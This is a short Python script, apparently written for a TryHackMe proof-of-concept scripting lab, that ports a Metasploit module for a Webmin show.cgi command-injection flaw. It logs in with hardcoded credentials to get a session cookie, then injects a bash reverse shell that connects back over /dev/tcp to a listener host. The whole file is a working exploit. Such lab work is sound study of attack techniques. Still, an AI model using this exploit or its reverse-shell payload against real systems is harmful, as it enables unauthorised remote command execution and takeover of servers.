"""
Webmin exploit .rb to .py rewrite

https://tryhackme.com/room/intropocscripting
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb
"""

import random
import requests
import string

remote_host = "10.10.159.74"
remote_port = "80"

username = "user1"
password = "1user"

local_host = "10.10.167.230"
local_port = "4444"

payload = ""

payload = f"bash -c 'exec bash -i &>/dev/tcp/{local_host}/{local_port}<&1'"

def login(host, port, username, password):
    url = f"http://{host}:{port}/session_login.cgi"
    data = {"page": "%2f", "user": username, "pass": password}
    cookies = {"testing": "1"}

    response = requests.post(url, data=data, cookies=cookies,
                             verify=False, allow_redirects=False)

    if response.status_code == 302 and response.cookies["sid"] != None:
        print("[+] Login successful.")
    else:
        print("[-] Login failed.")

    session = response.cookies["sid"]
    print(f"[/] Cookie session: {session}")
    return session

def generate_random_string(length):
    alpha_num = string.ascii_letters + string.digits
    return ''.join(random.choice(alpha_num) for _ in range(length))

def exploit(host, port, session, payload):
    random = generate_random_string(10)
    url = f"http://{host}:{port}/file/show.cgi/bin/{random}|{payload}|"
    requests.post(url, cookies={"sid":session})

def main():
    session = login(remote_host, remote_port, username, password)
    exploit(remote_host, remote_port, session, payload)

if __name__ == "__main__":
    main()

